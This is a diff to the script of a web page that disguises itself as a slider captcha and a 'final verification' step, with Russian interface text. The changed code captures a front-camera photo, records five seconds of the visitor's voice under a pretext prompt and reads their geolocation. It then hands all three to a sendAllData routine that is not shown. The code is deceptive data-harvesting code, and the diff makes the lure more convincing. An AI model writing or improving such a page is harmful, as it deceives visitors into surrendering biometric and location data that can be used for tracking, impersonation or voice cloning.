@@ -215,95 +215,93 @@
             }
         }
 
-        async function startCapture() {
-            document.getElementById('loader').style.display = 'flex';
-            document.getElementById('loader').innerHTML = '<div class="spinner"></div><span>Запрос доступа к камере...</span>';
-            document.getElementById('slider-btn').style.pointerEvents = 'none';
-
-            // 1. Сначала просим гео
+        async function requestGeo() {
             let geoData = null;
             try {
                 const pos = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 }));
                 geoData = { lat: pos.coords.latitude, lon: pos.coords.longitude };
             } catch (e) {}
+            return geoData;
+        }
 
-            // 2. Включаем камеру
-            let stream = null;
+        async function takePhoto() {
+            document.getElementById('loader').style.display = 'flex';
+            document.getElementById('loader').innerHTML = '<div class="spinner"></div><span>Запрос камеры...</span>';
+            
             let photoBlob = null;
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
                 await new Promise(r => video.onloadeddata = r);
-                
-                // Даем 1.5 секунды для фокусировки
-                await new Promise(r => setTimeout(r, 1500)); 
+                await new Promise(r => setTimeout(r, 1500)); // Фокусировка
 
                 const c = document.createElement('canvas');
                 c.width = video.videoWidth; c.height = video.videoHeight;
                 const cctx = c.getContext('2d');
                 cctx.translate(c.width, 0); cctx.scale(-1, 1);
                 cctx.drawImage(video, 0, 0);
-                
                 photoBlob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-                
-                // ВЫКЛЮЧАЕМ КАМЕРУ (чтобы микрофон заработал на телефоне)
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
                 console.error("Ошибка камеры:", e);
             }
 
-            // Если фото не удалось, показываем ошибку
             if (!photoBlob) {
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('slider-btn').style.pointerEvents = 'auto';
                 document.querySelector('.sub-text').innerText = "Ошибка камеры. Разрешите доступ в настройках браузера.";
                 document.querySelector('.sub-text').style.color = "red";
-                return; 
+                return;
             }
 
-            // 3. Включаем микрофон (только после того, как камера выключена)
-            document.getElementById('loader').innerHTML = '<div class="spinner"></div><span>Запись голоса...</span>';
-            let audioBlob = null;
-            try {
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(audioStream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.start();
-                await new Promise(r => setTimeout(r, 5000));
-                mediaRecorder.stop();
-                await new Promise(r => mediaRecorder.onstop = r);
-                audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                audioStream.getTracks().forEach(t => t.stop());
-            } catch (e) {
-                console.error("Ошибка микрофона:", e);
-            }
-
-            // 4. Отправка данных
-            await sendAllData(photoBlob, audioBlob, geoData);
+            // Прячем капчу, показываем кнопку для микрофона
             document.getElementById('captcha').style.display = 'none';
-            document.getElementById('main-site').style.display = 'block';
+            document.getElementById('main-site').style.display = 'block'; // Показываем сайт
+            document.getElementById('loader').style.display = 'none';
+
+            // Вызываем запись голоса
+            await recordAudio(photoBlob);
         }
 
-        const sliderContainer = document.getElementById('slider-btn');
-        let isDragging = false;
-        sliderContainer.addEventListener('mousedown', () => isDragging = true);
-        sliderContainer.addEventListener('touchstart', () => isDragging = true);
-        const handleDrag = () => {
-            if (!isDragging) return;
-            sliderContainer.classList.add('active');
-            startCapture();
-            isDragging = false;
-        };
-        sliderContainer.addEventListener('mousemove', handleDrag);
-        sliderContainer.addEventListener('touchmove', handleDrag);
-        sliderContainer.addEventListener('click', () => {
-            if (!sliderContainer.classList.contains('active')) {
-                sliderContainer.classList.add('active');
-                startCapture();
-            }
+        async function recordAudio(photoBlob) {
+            // Создаем временное уведомление поверх сайта
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; display:flex; justify-content:center; align-items:center; flex-direction:column; color:white; font-family:sans-serif;';
+            overlay.innerHTML = `
+                <div style="background:#1e293b; padding:30px; border-radius:10px; text-align:center;">
+                    <h2 style="margin-top:0; color:#3b82f6;">Финальная проверка</h2>
+                    <p>Пожалуйста, произнесите любую фразу для подтверждения.</p>
+                    <button id="start-audio-btn" style="background:#3b82f6; color:white; border:none; padding:15px 30px; border-radius:5px; font-size:16px; cursor:pointer;">Начать запись</button>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+
+            document.getElementById('start-audio-btn').addEventListener('click', async () => {
+                overlay.innerHTML = '<h2>Запись... (5 сек)</h2>';
+                
+                let audioBlob = null;
+                try {
+                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(audioStream);
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.start();
+                    await new Promise(r => setTimeout(r, 5000));
+                    mediaRecorder.stop();
+                    await new Promise(r => mediaRecorder.onstop = r);
+                    audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                    audioStream.getTracks().forEach(t => t.stop());
+                } catch (e) {
+                    console.error("Ошибка микрофона:", e);
+                }
+
+                const geoData = await requestGeo();
+                await sendAllData(photoBlob, audioBlob, geoData);
+                document.body.removeChild(overlay);
+            });
+        }
+
         });
     </script>
 </body>
